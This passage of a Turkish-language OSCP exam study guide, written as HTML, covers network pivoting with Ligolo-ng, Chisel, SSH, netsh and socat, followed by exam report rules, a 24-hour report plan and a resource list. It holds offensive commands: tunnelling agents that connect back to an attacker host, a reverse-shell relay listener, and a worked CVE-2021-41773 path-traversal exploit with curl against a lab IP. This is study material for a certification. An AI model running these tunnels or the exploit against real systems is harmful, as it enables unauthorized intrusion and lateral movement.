+<h2 id="112-ligolo-ng-önerilen-proxychains-gerektirmez">11.2 Ligolo-ng (önerilen — proxychains gerektirmez)</h2>
+<pre><code class="language-bash"># Kali
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+# Hedef (Linux / Windows)
+./agent -connect <span class="ph">LHOST</span>:11601 -ignore-cert
+.\agent.exe -connect <span class="ph">LHOST</span>:11601 -ignore-cert
+</code></pre>
+<pre><code class="language-text"># ligolo konsolunda (v0.6+)
+session                              → ajanı seç
+ifconfig                             → hedefin ağlarını gör
+interface_create --name ligolo
+interface_add_route --name ligolo --route 10.10.20.0/24
+tunnel_start --tun ligolo
+# İç ağdaki makineden reverse shell almak için ajan üzerinde dinleyici:
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443 --tcp
+</code></pre>
+<p>Artık <code>nmap -sT -Pn 10.10.20.10</code>, <code>nxc smb 10.10.20.0/24</code> doğrudan çalışır. İç makinede reverse shell için LHOST = <strong>pivot makinenin iç IP'si</strong>, port 4444.
+Pivot makinenin kendi <code>127.0.0.1</code> servisleri: özel adres <code>240.0.0.1</code> (route ekle: <code>--route 240.0.0.1/32</code>).</p>
+<p>(Eski sürüm ligolo kullanıyorsan: <code>sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; sudo ip route add 10.10.20.0/24 dev ligolo</code> ve konsolda <code>start</code>.)</p>
+<h2 id="113-chisel-socks-proxychains">11.3 Chisel (SOCKS + proxychains)</h2>
+<pre><code class="language-bash">./chisel server -p 8000 --reverse                         # Kali
+./chisel client <span class="ph">LHOST</span>:8000 R:socks                        # hedef → Kali'de 127.0.0.1:1080 SOCKS5
+./chisel client <span class="ph">LHOST</span>:8000 R:8080:127.0.0.1:8080          # tek port: hedefin localhost:8080'i → Kali:8080
+# /etc/proxychains4.conf son satır:  socks5 127.0.0.1 1080
+proxychains4 -q nmap -sT -Pn -p 21,22,80,135,139,445,1433,3389,5985 10.10.20.10
+proxychains4 -q nxc smb 10.10.20.0/24 -u $USER -p $PASS
+</code></pre>
+<h2 id="114-ssh">11.4 SSH</h2>
+<pre><code class="language-bash">ssh -L 8080:127.0.0.1:8080 user@$IP          # hedefin localhost:8080 → Kali:8080
+ssh -L 4455:10.10.20.10:445 user@$IP          # iç makine:445 → Kali:4455
+ssh -D 1080 -N user@$IP                        # dinamik SOCKS
+ssh -R 1080 -N kali@<span class="ph">LHOST</span>                      # hedeften Kali'ye ters dinamik (Kali'de sshd açık olmalı)
+sshuttle -r user@$IP 10.10.20.0/24             # VPN benzeri
+</code></pre>
+<h2 id="115-windows-yerleşik-araç-taşıyamıyorsan">11.5 Windows yerleşik / araç taşıyamıyorsan</h2>
+<pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.20.10
+netsh advfirewall firewall add rule name=&quot;p&quot; dir=in action=allow protocol=TCP localport=4455
+plink.exe -ssh -l kali -pw &lt;pw&gt; -R 127.0.0.1:9833:127.0.0.1:3389 <span class="ph">LHOST</span>
+</code></pre>
+<p>Linux'ta tek port: <code>socat TCP-LISTEN:4455,fork TCP:10.10.20.10:445 &amp;</code></p>
+<p>Proxychains ile nmap: sadece <code>-sT -Pn</code>, dar port listesi, <code>--max-retries 1</code>. ICMP/UDP geçmez.</p>
+<hr />
+<h1 id="12-rapor">12. Rapor</h1>
+<h2 id="121-teslim-kuralları">12.1 Teslim kuralları</h2>
+<ul>
+<li><strong>Format:</strong> Tek PDF, <strong>.7z</strong> arşiv içinde. Arşiv <strong>şifresiz</strong> ve <strong>en fazla 200 MB</strong>. Arşivde PDF dışında dosya olmaz: script ve PoC'ler PDF'in <strong>içine metin olarak</strong> konur.</li>
+<li><strong>Dosya adları (büyük/küçük harf duyarlı):</strong> <code>OSCP-OS-XXXXX-Exam-Report.pdf</code> ve <code>OSCP-OS-XXXXX-Exam-Report.7z</code> (XXXXX = OSID'in).</li>
+<li><strong>Yükleme:</strong> Sınav bittikten sonra <strong>24 saat</strong> içinde <code>https://upload.offsec.com</code>. "Submit File"a basmadan önce sitenin gösterdiği MD5'i kendi dosyanınkiyle (<code>md5sum</code>) karşılaştır. <strong>Gönderim kesindir</strong>, sonradan düzeltilemez.</li>
+<li><strong>Makine sırası:</strong> Makineler <strong>raporda göründükleri sırayla</strong> notlandırılır.</li>
+<li><strong>Şablon:</strong> OffSec'in Word / OpenOffice şablonu ya da yapılı ve profesyonel olduğu sürece kendi şablonun.</li>
+<li><strong>Dil:</strong> Kılavuz bir dil şartı <strong>belirtmiyor</strong>. Notlandırıcılar uluslararası olduğu için İngilizce yazmak en güvenli tercih; Türkçe düşünüyorsan önce OffSec desteğine sor.</li>
+<li>Değiştirdiğin public exploit'i rapora ekle (değişiklikleri vurgula + orijinal kaynak linki).</li>
+<li>Rapor yazarken de AI/LLM kullanmak yasak.</li>
+</ul>
+<p>Araç: OffSec şablonu (Word) ya da Markdown → PDF (<code>noraj/OSCP-Exam-Report-Template-Markdown</code>, pandoc + eisvogel). Şablonu <strong>sınavdan önce</strong> kur ve bir lab makinesiyle deneme raporu üret.</p>
+<h2 id="122-yapı">12.2 Yapı</h2>
+<pre><code class="language-text">1. High-Level Summary            (hangi makineler, hangi seviyede, kısa öneriler)
+2. Methodology                   (information gathering, exploitation, privesc — kısa)
+3. Active Directory Set          (makine makine, AD kanıtları)
+4. Standalone Machines           (her biri ayrı alt bölüm)
+   x.1 Service Enumeration       (nmap özet tablosu)
+   x.2 Initial Access            (zafiyet, CVE + link, adım adım komutlar, ekran görüntüleri)
+   x.3 Privilege Escalation      (adım adım)
+   x.4 Proof                     (local.txt / proof.txt ekran görüntüsü)
+5. Appendix                      (değiştirilmiş exploit kodları)
+</code></pre>
+<h2 id="123-her-adım-için-kalıp">12.3 Her adım için kalıp</h2>
+<pre><code class="language-markdown">**Step 3 — Exploiting Apache 2.4.49 path traversal (CVE-2021-41773)**
+The CGI directory allowed path traversal to /bin/sh, giving remote command execution:
+    curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
+      &quot;http://192.168.50.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;
+Output (Figure 7): uid=1(daemon) gid=1(daemon)
+</code></pre>
+<p>Kurallar: her komut kopyalanıp çalıştırılabilir olsun; "then I got root" gibi atlama yok; her ekran görüntüsüne numara ve tek cümle açıklama; exploit adına CVE ve kaynak linki.</p>
+<h2 id="124-24-saatlik-rapor-planı">12.4 24 saatlik rapor planı</h2>
+<table>
+<thead>
+<tr>
+<th>Saat</th>
+<th>İş</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0–3</td>
+<td>Uyu (sınavdan hemen sonra)</td>
+</tr>
+<tr>
+<td>3–5</td>
+<td>Şablonu doldur: başlıklar, nmap tabloları, ekran görüntülerini yerleştir</td>
+</tr>
+<tr>
+<td>5–10</td>
+<td>Makine bölümleri — komut + çıktı + figür</td>
+</tr>
+<tr>
+<td>10–11</td>
+<td>Özet, metodoloji</td>
+</tr>
+<tr>
+<td>11–13</td>
+<td>Baştan sona oku: her flag panelde mi, her komut doğru mu, IP'ler doğru mu</td>
+</tr>
+<tr>
+<td>13–14</td>
+<td>PDF → 7z → yükle → MD5 kontrol → onay e-postasını sakla</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="ekler">Ekler</h1>
+<h2 id="ek-a-sınav-günü-tek-sayfa">Ek A — Sınav günü tek sayfa</h2>
+<pre><code class="language-text">[ ] Kimlik, temiz masa, webcam, ekran paylaşımı (gözetmen)        [ ] VPN + tun0 IP → vars.sh
+[ ] tmux: 0 http.server  1 listener  2 komut  3 notlar             [ ] script ile terminal kaydı
+[ ] Panelden makine listesi + AD kimlik bilgileri not edildi
+[ ] Metasploit/Meterpreter'ı hangi makinede kullanacağına karar ver (en fazla 1; `check` da kullanım sayılır)
+[ ] Her makine: nmap -p- → -sC -sV → UDP 50 → web keşfi
+[ ] Her shell: TTY → ilk 10 dk haritası → kimlik avı
+[ ] Her kimlik: reuse matrisi (2.5) + nxc ile tüm ağ
+[ ] Her flag: etkileşimli kabuk + IP + whoami + hostname aynı karede → PANELE GİR
+[ ] 30 dakika kuralı                                                [ ] 03:00–07:00 uyku
+[ ] Son 90 dk: tüm kanıt + notlar tam mı?
+</code></pre>
+<h2 id="ek-b-hızlı-kanıt-komutları">Ek B — Hızlı kanıt komutları</h2>
+<pre><code class="language-bash">hostname; id; ip a | grep inet; cat local.txt     # Linux
+</code></pre>
+<pre><code class="language-powershell">hostname; whoami; ipconfig | findstr IPv4; type local.txt     # Windows PowerShell
+</code></pre>
+<h2 id="ek-c-kaynaklar">Ek C — Kaynaklar</h2>
+<table>
+<thead>
+<tr>
+<th>Kaynak</th>
+<th>Ne için</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OffSec OSCP+ Exam Guide, Exam FAQ, Equated Scaled Scoring FAQ, Proctoring FAQ</td>
+<td>Güncel kurallar (her şeyin üstünde) — help.offsec.com</td>
+</tr>
+<tr>
+<td>GTFOBins / LOLBAS</td>
+<td>Linux / Windows binary istismarı</td>
+</tr>
+<tr>
+<td>HackTricks / PayloadsAllTheThings</td>
+<td>Servis ve web teknikleri</td>
+</tr>
+<tr>
+<td>The Hacker Recipes</td>
+<td>AD saldırıları (ACL, Kerberos, ADCS)</td>
+</tr>
+<tr>
+<td>SecLists</td>
+<td>Wordlist</td>
+</tr>
+<tr>
+<td>TJnull / LainKusanagi OSCP listeleri</td>
+<td>PG Practice / HTB pratik makine listeleri</td>
+</tr>
+<tr>
+<td>PEN-200 Challenge Labs (OSCP A/B/C)</td>
+<td>Sınav formatına en yakın pratik</td>
+</tr>
+<tr>
+<td>IppSec videoları (ippsec.rocks)</td>
+<td>Teknik arama, çözüm düşüncesi</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Bu belge bir komut listesi değil, bir karar sistemi. Takıldığında komutu değil, <strong>hangi bilgiyi henüz toplamadığını</strong> sor.</p>
+</blockquote>
+</main>
+</div>
+<button id="menu" type="button">İçindekiler</button>
+<script>
+(function(){
+  var store={get:function(k){try{return localStorage.getItem(k)}catch(e){return null}},
+             set:function(k,v){try{localStorage.setItem(k,v)}catch(e){}}};
+  // copy buttons
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var w=document.createElement('div');w.className='codewrap';pre.parentNode.insertBefore(w,pre);w.appendChild(pre);
+    var b=document.createElement('button');b.className='copy';b.type='button';b.textContent='Kopyala';
+    b.onclick=function(){var t=pre.innerText;
+      (navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).catch(function(){
+        var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();
+        try{document.execCommand('copy')}catch(e){} ta.remove();});
+      b.textContent='Kopyalandı';setTimeout(function(){b.textContent='Kopyala'},1200);};
+    w.appendChild(b);
+  });
+  // LHOST live replace
+  var phs=document.querySelectorAll('.ph'), inp=document.getElementById('lhost');
+  function applyHost(v){phs.forEach(function(s){s.textContent=v||'LHOST'});}
+  var saved=store.get('oscp-lhost'); if(saved){inp.value=saved;applyHost(saved);}
+  inp.addEventListener('input',function(){applyHost(inp.value.trim());store.set('oscp-lhost',inp.value.trim());});
+  // theme
+  var root=document.documentElement, th=store.get('oscp-theme'); if(th) root.setAttribute('data-theme',th);
+  document.getElementById('theme').onclick=function(){
+    var dark=root.getAttribute('data-theme')==='dark'||(!root.getAttribute('data-theme')&&matchMedia('(prefers-color-scheme: dark)').matches);
+    var n=dark?'light':'dark';root.setAttribute('data-theme',n);store.set('oscp-theme',n);};
+  // sections for search + scrollspy
+  var main=document.querySelector('main'), secs=[], cur=null;
+  Array.prototype.slice.call(main.children).forEach(function(el){
+    if(el.tagName==='H1'||el.tagName==='H2'){cur={h:el,els:[el]};secs.push(cur);}
+    else if(cur) cur.els.push(el);
+  });
+  document.getElementById('q').addEventListener('input',function(e){
+    var q=e.target.value.trim().toLocaleLowerCase('tr');
+    secs.forEach(function(s){
+      var hit=!q||s.els.some(function(el){return el.textContent.toLocaleLowerCase('tr').indexOf(q)>-1});
+      s.els.forEach(function(el){el.classList.toggle('hidden',!hit)});
+    });
+  });
+  var links={}; document.querySelectorAll('nav.side .toc a').forEach(function(a){links[a.getAttribute('href').slice(1)]=a});
+  var obs=new IntersectionObserver(function(es){es.forEach(function(en){
+    if(en.isIntersecting&&links[en.target.id]){
+      document.querySelectorAll('nav.side a.active').forEach(function(a){a.classList.remove('active')});
+      links[en.target.id].classList.add('active');}});},{rootMargin:'0px 0px -75% 0px'});
+  secs.forEach(function(s){if(s.h.id)obs.observe(s.h)});
+  var side=document.getElementById('side');
+  document.getElementById('menu').onclick=function(){side.classList.toggle('open')};
+  side.addEventListener('click',function(e){if(e.target.tagName==='A')side.classList.remove('open')});
+})();
+</script>
+</body>
+</html>
